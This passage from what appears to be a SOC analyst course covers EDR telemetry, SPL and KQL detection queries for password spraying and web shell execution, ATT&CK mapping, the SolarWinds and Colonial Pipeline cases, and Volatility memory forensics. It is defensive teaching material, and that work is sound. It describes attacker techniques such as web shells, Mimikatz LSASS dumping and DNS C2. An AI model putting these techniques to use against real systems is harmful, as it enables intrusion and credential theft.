The file system telemetry capability catches web shell uploads from a different angle: the EDR agent records the exact moment a .php.aspx, or .jsp file is written to a web-accessible directory, including the writing process (which in the case of a legitimate upload should be the web application process, not a privileged account) and the SHA-256 hash of the written file. This hash can be immediately submitted to threat intelligence platforms like VirusTotal to determine if the file is a known web shell variant (many are, since PHP web shell code is largely standardized across the attacker community).

Network telemetry at the process level is perhaps the most valuable capability for detecting post-exploitation command-and-control activity. Traditional network monitoring captures connections between IP addresses but does not know which process on the source host initiated the connection. EDR correlates each outbound connection to the originating process: when powershell.exe makes an outbound HTTPS connection to an IP address not in the organization's business asset inventory, the EDR alert includes both the network connection details and the full command line of the PowerShell process that made it. This process-to-network correlation enables detection of "living-off-the-land" C2 techniques (MITRE T1071.001) that use legitimate system tools to blend in with normal HTTPS traffic.

MITRE ATT&CK Evaluations, conducted annually by MITRE's Center for Threat Informed Defense, independently assess EDR platforms by simulating a specific threat actor campaign (such as APT29 or Carbanak) against instrumented test environments and measuring what percentage of techniques each vendor's EDR detects without prior configuration or tuning. These public evaluation results are an important reference for SOC teams comparing EDR vendors.
:::

%%%
---
unit: Tools
code: SIEM
title: Tool Spotlight, SIEM Query Languages (SPL & KQL)
---
:::callout style=soft
SOC analysts query SIEM systems using specialized search languages. **Splunk Processing Language (SPL)** and **Kusto Query Language (KQL)** (Microsoft Sentinel) are the two most common in enterprise environments.
:::

::::columns ratio=1:1
::col::
::::card heading="SPL (Splunk), Detect Password Spray"
:::code language=sql
index=wineventlog EventCode=4625
| stats count(TargetUserName) as attempts,
        dc(TargetUserName) as unique_accounts
  by src_ip
| where unique_accounts > 10
| sort -unique_accounts
:::
::::
::col::
::::card heading="KQL (Sentinel), Web Shell Upload"
:::code language=sql
SecurityEvent
| where EventID == 4688
| where ParentProcessName has "w3wp"
| where NewProcessName has_any ("cmd","powershell","sh")
| project TimeGenerated, Computer,
          ParentProcessName, NewProcessName,
          CommandLine
| order by TimeGenerated desc
:::
::::
::::

:::image src="images/28_siem_query_languages.png" alt="Split-screen interface showing two SIEM consoles: left panel labeled 'Splunk Enterprise Security' shows a SPL query for password spray detection in a dark-background search bar; below the query, a results table shows three rows with columns src_ip, attempts, unique_accounts, the top row shows 198.51.100.45 with 94 attempts against 47 unique accounts highlighted in red; right panel labeled 'Microsoft Sentinel' shows a KQL query for web shell process detection in a light-background query editor; below the query, a results table shows two rows, both from Computer 'webserver01', showing w3wp.exe spawning cmd.exe and powershell.exe with suspicious CommandLine values; both panels have 'Run Query' buttons and a 'Time Range: Last 24 hours' selector highlighted" caption="SPL vs. KQL side by side: both queries detect the same attacker behavior using different syntax. The SPL query aggregates failed logons to find password spraying by source IP; the KQL query filters process creation events to find web shell command execution by parent-child process name matching." width=full
:::

:::notes
The ability to write and execute SIEM queries is a core technical skill for Tier 1 and Tier 2 SOC analysts. While many SIEM platforms provide pre-built dashboards and correlation rules that fire alerts automatically, investigation work requires analysts to write ad-hoc queries to dig deeper into specific time windows, filter for specific source IPs, or join data from multiple log sources that a pre-built rule did not anticipate.

Splunk Processing Language (SPL) is the query language for Splunk Enterprise and Splunk Enterprise Security, one of the most widely deployed SIEM platforms in large enterprises and government organizations. SPL is a pipeline language: each command is separated by a pipe character (|), and the output of one command becomes the input of the next. The `stats` command aggregates events by specified dimensions, similar to SQL GROUP BY. The `dc()` function counts distinct values (like SQL COUNT DISTINCT), which is exactly what the password spray query needs, counting how many unique TargetUserName values appear for each source IP. The `where` clause filters the results to only show source IPs with more than 10 unique targeted accounts, eliminating noise from legitimate multi-user systems.

Kusto Query Language (KQL) is used in Microsoft Sentinel (the cloud-native Azure SIEM), Microsoft Defender XDR, and Azure Monitor. KQL uses a similar pipeline structure but with different operator names. The `has` operator performs a case-insensitive substring match, while `has_any` matches any value in a list, so `NewProcessName has_any ("cmd","powershell","sh")` catches all variants of shell interpreters regardless of full path. The `project` operator selects which columns to display, equivalent to SQL SELECT with explicit column names.

Beyond these two, the Elastic Stack uses its own Elasticsearch Query DSL (a JSON-based language) alongside EQL (Event Query Language) for behavioral sequence detection, KQL is also partially supported in Kibana for simpler queries. IBM QRadar uses its own Ariel Query Language (AQL), which follows a SQL-like structure closer to traditional relational database queries.

For analysts transitioning between platforms, the conceptual operations are the same regardless of syntax: filter by field values, aggregate by dimensions, count distinct values, join across data sources, and sort results. Proficiency in one SIEM query language makes it substantially easier to learn others.

Running a SIEM query (in SPL or KQL) against a real dataset and watching the results populate connects the query syntax to the analyst's operational workflow in a way a static slide does not.
:::

%%%
---
unit: Checkpoint
code: CHK1
title: Mid-Lecture Checkpoint, Attack Phase Matching
---
:::callout style=soft
Before continuing, let's verify your understanding of the attack progression we have analyzed. Match each observable artifact to the correct MITRE ATT&CK technique.
:::

:::table
| Observable Artifact | ATT&CK Tactic | ATT&CK Technique | Answer |
|---|---|---|---|
| 45 TCP SYN packets from single IP to 45 different destination ports | Discovery | ? | T1046, Network Service Discovery |
| 47× Event ID 4625 against user "jsmith" from same source IP | Credential Access | ? | T1110.001, Brute Force: Password Guessing |
| POST /uploads/shell.php returning HTTP 201 Created | Persistence | ? | T1505.003, Server Software Component: Web Shell |
| w3wp.exe spawning cmd.exe with `whoami` command | Execution | ? | T1059.003, Command and Scripting Interpreter: Windows Command Shell |
| Event ID 4624 (LogonType=3) from DMZ host to internal workstation | Lateral Movement | ? | T1021.002, Remote Services: SMB/Windows Admin Shares |
:::

:::callout style=soft
**Common error:** Students often classify the port scan under "Initial Access" because it happens first. Reconnaissance and Discovery are the correct tactics, Initial Access requires actually gaining a foothold, not just mapping the surface.
:::

:::image src="images/28_checkpoint_attack_matching.png" alt="Interactive matching exercise visualization: on the left column, five artifact boxes are labeled with log snippets, 'Firewall: 45 SYN packets', 'AD: 47x EventID 4625', 'Web: POST shell.php 201', 'EDR: w3wp.exe → cmd.exe', 'Auth: 4624 LogonType=3 DMZ→Internal'; on the right column, five ATT&CK technique boxes show technique IDs and names; color-coded connection lines link each artifact to its correct technique, all lines are shown (answer reveal format); a horizontal progress bar at the top reads 'Checkpoint 1 of 2, Attack Phase Mapping'; a score box in the corner reads 'Target: 5/5 correct'" caption="Checkpoint matching exercise: five log artifacts mapped to their correct MITRE ATT&CK techniques. The most commonly confused pair is the port scan (Discovery T1046) vs. Initial Access, the scan precedes access but does not constitute access itself." width=full
:::

:::notes
This checkpoint is designed to consolidate your understanding of how raw log artifacts map to the MITRE ATT&CK taxonomy before we move into the case study and advanced detection topics. The ability to quickly classify what you are observing in logs is a foundational analyst skill, it determines how you escalate, what further logs you pull, and how you write the incident report.

Let's walk through each mapping in detail. The 45 TCP SYN packets are classified under the Discovery tactic, specifically T1046, Network Service Discovery. Note carefully that this is NOT under Initial Access, even though it is the first observed activity. Initial Access requires the attacker to have actually obtained a foothold in the environment, for example, exploiting a vulnerability, phishing a credential, or abusing a valid account. Port scanning maps to Discovery because it is reconnaissance to identify the network attack surface, not an entry into the environment itself.

The 47 failed logons against a single account map to T1110.001, Brute Force: Password Guessing. The parent technique T1110 covers all credential brute-force approaches, while the sub-technique .001 specifies the pattern of guessing passwords for a single account. Password spraying would be T1110.003, and credential stuffing (using known username-password pairs from data breaches) would be T1110.004. These sub-technique distinctions matter for detection rule design, since each requires a different SIEM query approach.

The PHP web shell upload maps to T1505.003, Server Software Component: Web Shell. The parent technique T1505 covers any modification or addition to a server-side software component to achieve persistence. The web shell sub-technique is by far the most commonly observed variant. This maps to the Persistence tactic because the web shell gives the attacker a mechanism to return to the compromised server even after their initial SSH or HTTP connection closes, as long as the file remains on disk and the web server continues running, the attacker can issue commands by sending HTTP requests to the shell URL.

The w3wp.exe spawning cmd.exe maps to T1059.003, Command and Scripting Interpreter: Windows Command Shell. This is under the Execution tactic, capturing the attacker's use of the Windows Command Prompt to run system enumeration and download commands. Finally, the internal lateral movement authentication maps to T1021.002, Remote Services: SMB/Windows Admin Shares, the specific lateral movement method of using SMB network shares combined with NTLM credentials to execute processes on remote hosts.

A port scan is commonly misclassified: it belongs to the Discovery tactic, not Initial Access, because scanning gathers information about a target already reachable rather than gaining the first foothold.
:::

%%%
---
unit: CaseStudy
code: CS1
title: Case Study, SolarWinds Supply Chain Attack (2020)
---
:::callout style=soft
The **SolarWinds SUNBURST attack** (2020) was one of the most sophisticated supply chain compromises ever documented. Nation-state actors (attributed to APT29/Cozy Bear) injected malicious code into SolarWinds' legitimate software update process, compromising thousands of organizations.
:::

:::list style=tight
- **Initial access vector:** Malicious DLL (SUNBURST) embedded in SolarWinds Orion software update **SolarWinds.Orion.Core.BusinessLayer.dll**, signed with SolarWinds' legitimate code signing certificate.
- **C2 mechanism:** SUNBURST communicated over DNS using subdomains of `avsvmcloud.com` to blend in with legitimate DNS traffic (MITRE T1071.004, Application Layer Protocol: DNS).
- **Dwell time:** Attackers maintained access for **9–14 months** before discovery in December 2020.
- **Victims:** Estimated 18,000 organizations received the trojanized update; approximately 100 received secondary payloads enabling deep access.
- **Discovery:** FireEye detected the breach while investigating unauthorized use of their own red team tools, which had been stolen by the attackers.
:::

::::columns ratio=1:1
::col::
::::card heading="Detection Failures"
:::list style=tight
- SUNBURST DLL passed legitimate code signing verification, no hash-based AV detection.
- DNS C2 used randomized subdomains, blocked by domain reputation, not pattern matching.
- 14-day dormancy period post-infection before C2 activation, evaded sandbox detection.
:::
::::
::col::
::::card heading="Post-Incident Lessons"
:::list style=tight
- Software Bill of Materials (SBOM) requirements now mandated by US Executive Order 14028 (2021).
- Zero-trust network segmentation limits blast radius of supply chain compromises.
- DNS monitoring and anomaly detection for DGA-like subdomains is now a standard control.
:::
::::
::::

:::image src="images/28_solarwinds_attack_chain.png" alt="Attack chain diagram with six sequential boxes connected by arrows: Box 1 labeled 'SolarWinds Build Environment Compromised, SUNBURST code injected into Orion source before compilation'; Box 2 labeled 'Trojanized Update Signed, legitimate SolarWinds certificate applied to malicious DLL'; Box 3 labeled 'Update Distributed, 18,000 organizations download and install Orion update via auto-update'; Box 4 labeled '14-Day Dormancy, SUNBURST sleeps to evade sandbox analysis'; Box 5 labeled 'DNS C2 Activation, random subdomains of avsvmcloud.com encode victim telemetry in DNS queries'; Box 6 labeled 'Secondary Payload Deployment, TEARDROP/RAINDROP loaders deployed to ~100 high-value targets'; a red dashed box labeled 'Discovery: December 2020 by FireEye (9-14 months post-infection)' surrounds the final box; victim logos appear faintly below the chain" caption="SolarWinds SUNBURST attack chain: the compromise began in the software build environment, making every subsequent security control irrelevant, the malicious DLL was signed and distributed through the vendor's legitimate update channel, bypassing every perimeter and endpoint control." width=full
:::

:::notes
The SolarWinds SUNBURST attack, publicly disclosed in December 2020 after discovery by FireEye cybersecurity firm, represents a paradigm-shifting case study in supply chain security failures and the limits of traditional security monitoring. Understanding this attack is essential for any cybersecurity professional because it demonstrated that an organization could implement every recommended security control, perimeter firewalls, antivirus software, multi-factor authentication, network segmentation, and still be comprehensively compromised through a vector that bypassed all of them simultaneously.

The attack succeeded because it targeted the software supply chain, specifically the build process of SolarWinds' Orion IT monitoring platform. Orion is used by approximately 33,000 organizations worldwide, including US federal agencies, Fortune 500 companies, and critical infrastructure providers. The attackers, attributed with high confidence by the US government to APT29, a Russian intelligence service-affiliated group, compromised SolarWinds' software build environment and injected a malicious backdoor (named SUNBURST by FireEye) into the Orion source code. The build process compiled this malicious code into a legitimate DLL file (SolarWinds.Orion.Core.BusinessLayer.dll), which was then signed with SolarWinds' authentic code signing certificate.

When SolarWinds pushed this update to customers through their standard auto-update mechanism, approximately 18,000 organizations installed the trojanized DLL. Since the file passed code signature verification, no traditional antivirus or hash-based detection would flag it, it was genuinely signed by SolarWinds, the trusted vendor. This is the fundamental challenge of supply chain attacks: they exploit the trust relationship between software vendors and their customers, turning the vendor's trusted delivery mechanism into an attack vector.

SUNBURST's command-and-control mechanism was equally sophisticated. After a 14-day dormancy period (designed to exceed the analysis window of most automated sandbox environments), the malware began encoding victim system information into DNS lookup requests for randomized subdomains of `avsvmcloud[.]com`, a domain controlled by the attackers. DNS-based C2 (MITRE T1071.004) is difficult to detect because DNS queries are generated by thousands of legitimate applications and are generally not inspected as closely as HTTP or TCP connections. The randomized subdomain pattern resembles Domain Generation Algorithm (DGA) malware, but was subtle enough to evade detection for months.

The response from the US government included Executive Order 14028 (May 2021), "Improving the Nation's Cybersecurity," which mandated Software Bills of Materials (SBOMs) for federal software procurement, essentially requiring software vendors to document every component included in their products, enabling customers to assess supply chain risk. This case study directly shaped national cybersecurity policy.

CISA advisory AA20-352A on SolarWinds exploitation provides technical indicators of compromise, YARA rules for SUNBURST detection and mitigation guidance, an excellent primary source for deeper research.
:::

%%%
---
unit: CaseStudy
code: CS2
title: Case Study, Colonial Pipeline Ransomware (2021)
---
:::callout style=soft
The **Colonial Pipeline ransomware attack** (May 2021) caused the largest disruption to US fuel infrastructure in history. The DarkSide ransomware group gained access through a **compromised VPN password**, no multi-factor authentication was enabled.
:::

:::steps
**Initial Access (May 7, 2021):** DarkSide used a compromised password for a legacy VPN account to access Colonial's IT network. The account was no longer in active use but had not been disabled. No MFA was enforced on the VPN.
**Lateral Movement:** Attackers moved from the IT network to internal systems over approximately one week of prior reconnaissance.
**Data Exfiltration (T1041):** Approximately 100 GB of data was stolen before ransomware deployment, used as leverage in double extortion.
**Ransomware Deployment:** DarkSide encrypted systems across Colonial's IT network. Colonial proactively shut down OT (operational technology) pipeline control systems as a precaution.
**Impact:** 5,500 miles of pipeline carrying 45% of East Coast fuel supply was halted for 6 days. Colonial paid $4.4 million in Bitcoin ransom (recovered $2.3M by DOJ).
:::

::::columns ratio=1:1
::col::
::::card heading="Root Cause Controls"
:::list style=tight
- **MFA on all remote access**, would have prevented this specific breach.
- **Account lifecycle management**, disabled accounts create persistent attack surface.
- **IT/OT network segmentation**, prevents ransomware from reaching operational systems.
:::
::::
::col::
::::card heading="Regulatory Response"
:::list style=tight
- **TSA Security Directive (May 2021):** Critical pipeline operators required to report cybersecurity incidents to CISA within 12 hours.
- **CISA Advisory AA21-131A:** Published IoCs and DarkSide TTPs for industry-wide defense.
:::
::::
::::

:::image src="images/28_colonial_pipeline_attack.png" alt="Incident timeline diagram with a horizontal axis labeled May 2021: a red marker at May 6 labeled 'Compromised VPN credential used, legacy account, no MFA'; a red marker at May 7 labeled 'DarkSide ransomware deployed across IT network'; a yellow marker at May 7 labeled 'Colonial Pipeline shuts down OT systems proactively'; a green marker at May 12 labeled 'Pipeline operations begin to resume after $4.4M ransom paid'; a blue marker at May 28 labeled 'DOJ recovers $2.3M in Bitcoin via seizure of attacker wallet'; below the timeline, impact metrics show: '6 days of shutdown', '45% East Coast fuel disrupted', '11 US states declared fuel emergency', '$4.4M ransom paid'; a root cause callout box reads 'Single point of failure: no MFA on VPN access'" caption="Colonial Pipeline attack timeline: the entire incident chain, from initial access to pipeline shutdown, was enabled by a single missing control: multi-factor authentication on VPN access. The 6-day shutdown cost an estimated $90M in economic impact beyond the $4.4M ransom." width=full
:::

:::notes
The Colonial Pipeline ransomware incident is the most consequential cybersecurity attack against US critical infrastructure in the modern era, and it illustrates a sobering truth: catastrophic operational impact can result from a fundamentally simple security failure. The attack did not involve a zero-day vulnerability, sophisticated evasion of advanced security controls, or nation-state-level technical capability. It succeeded because a single legacy VPN account with a compromised password had no multi-factor authentication requirement.

The attacker, the DarkSide ransomware-as-a-service (RaaS) group, gained access to Colonial's network using credentials that appear to have been obtained either from a prior data breach or credential theft operation, the password was found in a set of leaked credentials on the dark web, suggesting it had been reused across multiple services. This is the risk that NIST SP 800-63B's Digital Identity Guidelines addresses through its prohibition on commonly-used and previously-breached passwords, and its recommendation for phishing-resistant MFA for all accounts accessing sensitive systems.

The compromised account was for a legacy VPN product that Colonial had transitioned away from but had not decommissioned. Disabled or orphaned accounts are a persistent problem in large enterprise environments, employees leave, systems are replaced, and the associated accounts are forgotten rather than deleted. This practice of maintaining accounts past their useful lifecycle violates the principle of least privilege (NIST SP 800-53 AC-2 Account Management) and creates an invisible attack surface that grows over time.

Colonial's decision to proactively shut down their OT (operational technology) pipeline control systems, even though there is no confirmed evidence that the ransomware itself reached the OT network, was made out of an abundance of caution to prevent the encryption of operational systems that directly control physical pipeline infrastructure. The 6-day shutdown cost far more in economic impact than the ransomware encryption alone would have caused to the IT network. This illustrates why IT/OT network segmentation is a critical control in industrial environments: air-gapping or strictly firewalling OT systems from the IT network prevents a ransomware compromise of the IT environment from propagating to operational systems.

The US Department of Justice recovered $2.3 million of the $4.4 million Bitcoin ransom by seizing the attacker's wallet through law enforcement access to the private key. While this partial recovery is notable, it also demonstrates that Bitcoin is less anonymous than many assume, the blockchain's transparency allowed investigators to trace the funds and, in this case, access a wallet hosted on a server with a known IP address. DarkSide's infrastructure was subsequently seized and the group disbanded shortly after the Colonial incident, likely due to the intense law enforcement attention.
:::

%%%
---
unit: Forensics
code: MEM
title: Memory Forensics & Volatile Evidence
---
:::callout style=soft
**Memory forensics**, the analysis of a captured RAM image, is the primary technique for detecting fileless malware, injected code, and in-memory credential theft tools like **Mimikatz**. Evidence in RAM is lost at power-off, making capture time-critical.
:::

:::table
| Memory Artifact | What It Reveals | Analysis Tool |
|---|---|---|
| **Active Process List** | Running processes including hidden/injected ones | `volatility3 -f mem.raw windows.pslist` |
| **Network Connections** | Open TCP/UDP sockets at time of capture | `volatility3 -f mem.raw windows.netstat` |
| **Process Memory Dump** | Injected shellcode, strings, PE headers in unexpected regions | `volatility3 -f mem.raw windows.malfind` |
| **Registry Hives in Memory** | Cached SAM/SECURITY hives containing password hashes | `volatility3 -f mem.raw windows.registry.hivelist` |
| **Clipboard Contents** | Text the user copied before capture | `volatility3 -f mem.raw windows.clipboard` |
| **Browser Artifacts** | In-memory page cache, form autofill, session tokens | Strings extraction from browser process dump |
:::

:::image src="images/28_memory_forensics_volatility.png" alt="Terminal window showing Volatility 3 output: top section shows the output of windows.malfind plugin with three suspicious memory regions highlighted in red, all three show 'MZ' PE header magic bytes at unexpected memory addresses within the svchost.exe process (PID 1044), indicating process injection; a hexdump of one region is shown with the 'MZ' and 'PE' markers annotated; middle section shows windows.netstat output with one suspicious entry: PID 1044 (svchost.exe) has an established TCP connection to 203.0.113.50:443, an external IP not in the internal asset inventory; a callout annotation reads 'Legitimate svchost.exe never initiates outbound internet connections, this confirms process injection + C2'; bottom section shows windows.pslist with the full process list, svchost.exe at PID 1044 highlighted with an anomaly badge" caption="Volatility 3 memory forensics output: the malfind plugin detects a PE header (MZ magic bytes) injected into svchost.exe's memory space, classic process injection. The netstat correlation shows the injected code is actively communicating with an external C2 server at 203.0.113.50:443." width=full
:::

:::notes
Fileless malware, malicious code that executes entirely in system memory without writing a persistent file to disk, represents one of the most significant detection challenges in modern cybersecurity. Traditional antivirus and endpoint protection tools that rely on scanning files on disk will find nothing to detect, because the malware exists only as code pages within a legitimate process's memory space. The only reliable method to detect and analyze fileless malware is memory forensics: capturing a live image of the system's RAM and analyzing it with tools designed to reconstruct the runtime state of the operating system.

The Volatility framework is the industry-standard open-source tool for Windows, Linux, and macOS memory forensics. It takes a raw memory image file as input and provides dozens of analysis plugins that extract specific artifacts from the memory layout. The `windows.pslist` plugin reconstructs the active process list by traversing the kernel's EPROCESS data structure, the same data structure Windows itself uses to track running processes. Malware that attempts to hide itself using DKOM (Direct Kernel Object Manipulation) by unlinking its process from the EPROCESS list can sometimes be detected by comparing the pslist output to the output of `windows.psscan`, which scans all memory pages for the EPROCESS signature rather than walking the linked list.

The `windows.malfind` plugin is specifically designed to identify memory regions that contain executable code (indicated by the MZ/PE header magic bytes) in unexpected locations, such as the heap or stack space of a legitimate process. When a process injector (such as Mimikatz or a Cobalt Strike beacon) injects shellcode into a running legitimate process like svchost.exe, the injected code resides in a memory region with EXECUTE permission that was allocated dynamically, a pattern that malfind recognizes. The presence of a PE header in these regions strongly suggests that a complete portable executable (a DLL or EXE) was injected, rather than just position-independent shellcode.

Mimikatz (MITRE T1003.001, OS Credential Dumping: LSASS Memory) is a freely available tool that reads the LSASS (Local Security Authority Subsystem Service) process memory to extract plaintext passwords, NTLM hashes, and Kerberos tickets cached by Windows. It requires SYSTEM or local administrator privilege to read LSASS memory. Memory forensics can detect post-Mimikatz artifacts: after Mimikatz reads LSASS, the strings "sekurlsa" or "logonPasswords" may be present in the memory of the process that ran Mimikatz, and extracted credentials may persist in that process's memory. Windows Credential Guard, introduced in Windows 10, prevents plaintext credential extraction from LSASS by moving credential storage into an isolated virtual machine managed by the hypervisor, a control specifically designed to mitigate Mimikatz-class attacks.

RFC 3227 requires that memory capture occur before any other forensic action on a live system, since memory contents change constantly as processes run, network connections are established, and cached data expires. The recommended tools for Windows memory capture without requiring a kernel module installation include WinPmem and the Microsoft-developed `NotMyFault` utility in some configurations. On Linux, LiME (Linux Memory Extractor) is a loadable kernel module that exports a raw memory image to disk or directly over the network to a remote collection server.
:::

%%%
---
unit: Framework
code: TI
title: Threat Intelligence Integration
---
:::callout style=soft
**Threat intelligence** transforms raw IoCs into contextualized knowledge about who is attacking, how, and why. Integrating threat intel feeds into SIEM enrichment dramatically reduces triage time by automatically flagging known-malicious indicators.
:::

:::table
| Intelligence Type | Examples | Integration Point |
|---|---|---|
| **Strategic** | Nation-state motivations, industry targeting trends | Executive risk briefings, investment decisions |
| **Tactical** | TTPs of specific threat actor groups (APT28, Lazarus) | Detection rule and playbook development |
| **Operational** | Active campaigns, specific CVEs being exploited | Patch prioritization, hunt queries |
| **Technical** | IoCs: IPs, domains, file hashes, YARA rules | SIEM auto-enrichment, firewall blocklists |
:::

:::list style=tight
- **STIX/TAXII:** Open standards for sharing and consuming threat intelligence in a machine-readable format (OASIS standard).
- **MISP (Malware Information Sharing Platform):** Open-source threat intelligence sharing community used by government CERTs and ISACs.
- **CISA AIS (Automated Indicator Sharing):** Free US government threat intelligence feed available to qualifying organizations.
- **Commercial feeds:** Recorded Future, Mandiant Threat Intelligence, CrowdStrike Falcon Intelligence.
:::

:::image src="images/28_threat_intelligence_integration.png" alt="Data flow diagram showing threat intelligence pipeline: on the left, five source icons labeled CISA AIS, MISP Community, VirusTotal, Commercial Feed, and ISAC Sharing Point; arrows labeled STIX/TAXII feed into a central TIP (Threat Intelligence Platform) box; from the TIP, three output arrows point right to: a SIEM box labeled 'Automatic IoC Enrichment, flags known-malicious IPs, domains, hashes in real-time'; a Firewall box labeled 'Automated IP Blocklist Push, blocks known C2 infrastructure'; and a Hunt Queries box labeled 'Analyst-Triggered Hunt, TTPs from tactical intelligence drive proactive searches'; at the bottom of the SIEM box, an alert card shows an enriched event: 'Source IP 198.51.100.45, ThreatIntel Match: Known DarkSide affiliate C2 server (confidence: HIGH)'" caption="Threat intelligence pipeline: feeds from government and commercial sources are normalized by a TIP and distributed to SIEM enrichment, firewall blocklists, and analyst hunt queues, converting raw IoCs into automated defensive action." width=full
:::

:::notes
Threat intelligence is the practice of collecting, analyzing, and operationalizing information about the capabilities, infrastructure, and intentions of adversaries in order to improve the timeliness and accuracy of security decisions. Without threat intelligence, every IoC encountered during an investigation must be assessed from scratch: is this IP address malicious, or a legitimate cloud provider? Is this domain a newly registered C2, or a legitimate business? Threat intelligence platforms provide context by cross-referencing indicators against curated, community-verified databases of known-malicious infrastructure and attacker tooling.

The four tiers of threat intelligence map to different organizational consumers. Strategic intelligence, high-level analysis of geopolitical motivations, industry-sector targeting patterns, and attacker nation-state attribution, informs executive risk decisions about investment priorities and geopolitical exposure. Tactical intelligence, detailed profiles of specific threat actor groups including their preferred initial access methods, post-exploitation toolkits, and target selection criteria, informs the SOC's detection engineering and response playbook development. Operational intelligence, information about active, ongoing attack campaigns including the specific CVEs being exploited and the infrastructure currently in use, drives immediate actions like emergency patching or preemptive firewall blocking. Technical intelligence, concrete indicators like IP addresses, domain names, file hashes, email subjects, and YARA rules, feeds directly into automated SIEM enrichment and firewall blocklist synchronization.

STIX (Structured Threat Information eXpression) and TAXII (Trusted Automated eXchange of Indicator Information) are OASIS open standards that define a common format and transport protocol for sharing threat intelligence between organizations. A STIX bundle can describe a threat actor, their campaign, the malware they use, the IoCs associated with that malware, and the mitigations that address their techniques, all in a structured JSON format that SIEM platforms and threat intelligence platforms can ingest automatically. The US government's CISA Automated Indicator Sharing (AIS) program uses TAXII to distribute STIX-formatted indicators to qualifying private sector organizations at no cost, enabling automated firewall and SIEM updates when new government-discovered IoCs are published.

The MISP (Malware Information Sharing Platform) is an open-source threat intelligence sharing community hosted by the EU CIRCL (Computer Incident Response Center Luxembourg) with thousands of participating organizations across government, private sector, and ISACs (Information Sharing and Analysis Centers). MISP allows organizations to both consume shared intelligence and contribute their own incident findings to the community, improving collective defense across sectors.

When a SIEM enriches events against threat intelligence feeds, the investigation workflow changes dramatically. Instead of manually cross-referencing every suspicious IP address against VirusTotal or WHOIS, the SIEM automatically tags each event with the threat intelligence match and confidence level. An analyst who sees "Source IP, ThreatIntel Match: Known DarkSide affiliate C2 (confidence: HIGH)" can immediately escalate without additional enrichment research, compressing triage time from minutes to seconds.
:::

%%%
---
unit: Misconceptions
code: FAQ
title: Common Misconceptions in Incident Response
---
:::callout style=soft
Several persistent misconceptions cause analysts to make incorrect triage decisions. Understanding and correcting these errors is as important as learning the correct techniques.
:::

:::table
| Misconception | Why It's Wrong | Correct Understanding |
|---|---|---|
| "If there's no malware file on disk, there's no infection." | Fileless malware and process injection live entirely in memory, no disk artifact. | Malware can operate entirely in RAM; memory forensics and EDR behavioral detection are required. |
| "The attacker's IP address is the attacker's real location." | Attackers route through VPNs, Tor exit nodes, and compromised intermediate hosts. | Source IPs identify the proximate origin, not the actor. Geolocation provides limited actionable data. |
| "Pulling the power plug is the safest containment action." | Instant power loss destroys all volatile evidence (RAM, network state, process list). | Follow RFC 3227: capture volatile evidence first, then perform controlled shutdown if needed. |
| "Our system wasn't the target, so we don't need to investigate." | Opportunistic compromise and supply chain pivots mean any system can be a stepping stone to a high-value target. | Every compromise must be fully investigated regardless of the asset's perceived criticality. |
| "An IDS alert means we're definitely being attacked." | IDS systems generate high false positive rates; alert validation is the first analyst task. | Alerts are hypotheses, not confirmed incidents, they require evidence-based validation before escalation. |
:::

:::image src="images/28_misconceptions_faq.png" alt="Five myth-busting cards arranged in a grid: each card has a red 'MYTH' banner at the top, the misconception text below in italic, and a green 'REALITY' banner with the corrected understanding; Card 1: Myth 'No file = no malware' vs Reality 'Fileless malware lives in RAM'; Card 2: Myth 'Source IP = attacker location' vs Reality 'IPs are proximate, not attributable'; Card 3: Myth 'Pull the plug to contain' vs Reality 'Volatile evidence lost, RFC 3227 first'; Card 4: Myth 'Not the target = safe to ignore' vs Reality 'Stepping stones have real impact'; Card 5: Myth 'IDS alert = confirmed attack' vs Reality 'Alerts are hypotheses needing validation'; each card includes a small icon illustrating the concept" caption="Five common incident response misconceptions: each represents a specific analytical error that causes defenders to miss evidence, misjudge risk, or make containment decisions that worsen the outcome. Memorizing these corrections before the lab reduces avoidable mistakes." width=full
:::

:::notes
Every cybersecurity course includes foundational technical content, but the misconceptions that persist among practitioners, even experienced ones, are equally important to address directly. These five misconceptions consistently appear as root causes of investigation failures, missed detections, and incorrect containment decisions in real-world incident reports.

The first misconception, that the absence of a disk-resident malware file means the system is clean, is increasingly consequential as fileless malware techniques have become mainstream in both nation-state and criminal ransomware campaigns. The 2020 SUNBURST malware operated primarily in memory after its initial DLL was loaded. Cobalt Strike Beacon, the most commonly deployed post-exploitation tool in enterprise intrusions according to IBM X-Force's 2024 Threat Intelligence Index, is frequently deployed in a "fileless" configuration that injects a reflective DLL into the memory of a legitimate process. Traditional antivirus scanning will find nothing to flag because there is no file to scan. Only EDR behavioral detection and memory forensics can identify these threats.

The second misconception, that a source IP address tells you where the attacker is, leads analysts to waste time on geographic attribution that has no investigative value. Professional threat actors route all traffic through chains of compromised servers, commercial VPN services, Tor exit nodes, and bulletproof hosting providers specifically to prevent attribution. The source IP in a firewall log tells you where the packet came from at the network layer, not where the human operator is located. Geolocation data is occasionally useful for ruling out legitimate internal users (a connection from a country where the organization has no presence is anomalous), but is unreliable for positive attribution.

The "pull the plug" containment instinct is particularly dangerous during live investigations. Many responders instinctively want to stop the attacker immediately by cutting power, but this destroys the RAM contents (including injected malware code, network connections, and in-memory credentials) and may corrupt open file system structures. RFC 3227 explicitly addresses this: if the system must be taken offline, first capture a full RAM image using WinPmem or LiME, then perform a controlled shutdown via the operating system shutdown command (which flushes disk write buffers and cleanly unmounts file systems) rather than a hard power cut.

The misconception that lower-criticality systems need not be fully investigated reflects a misunderstanding of how modern attack campaigns progress. Attackers frequently use peripheral systems, printers, security cameras, HVAC controllers, as initial footholds to establish presence in a network segment before pivoting to higher-value targets. The SolarWinds and Colonial Pipeline incidents both involved initial compromises of systems that the affected organizations might have characterized as non-critical, had they been able to predict the eventual scope.

Finally, treating every IDS alert as a confirmed incident is unsustainable and leads to alert fatigue. IDS systems, particularly signature-based ones, generate significant false positive rates because attack signatures often match benign traffic patterns. The Tier 1 analyst's first task upon receiving any alert is to validate it: is there corroborating evidence from at least one other log source? Does the source IP have any other suspicious activity? Does the flagged traffic occur during business hours or outside them? Only after answering these questions should the alert be escalated or dismissed.

:::

%%%
---
unit: Tools
code: PCAP
title: Tool Spotlight, Network Traffic Analysis with Wireshark
---
:::callout style=soft
**Wireshark** is the most widely used open-source network protocol analyzer. SOC analysts use packet captures (PCAPs) to reconstruct network sessions, validate attacker behavior observed in firewall logs, and identify data exfiltration content.
:::

:::list style=tight
- Wireshark displays network packets at all protocol layers, Ethernet, IP, TCP/UDP, and application-layer protocols (HTTP, DNS, SMTP, SMB).
- **Display filters** narrow packets to specific IPs, protocols, or content: `ip.src == 198.51.100.45 && tcp.port == 80`
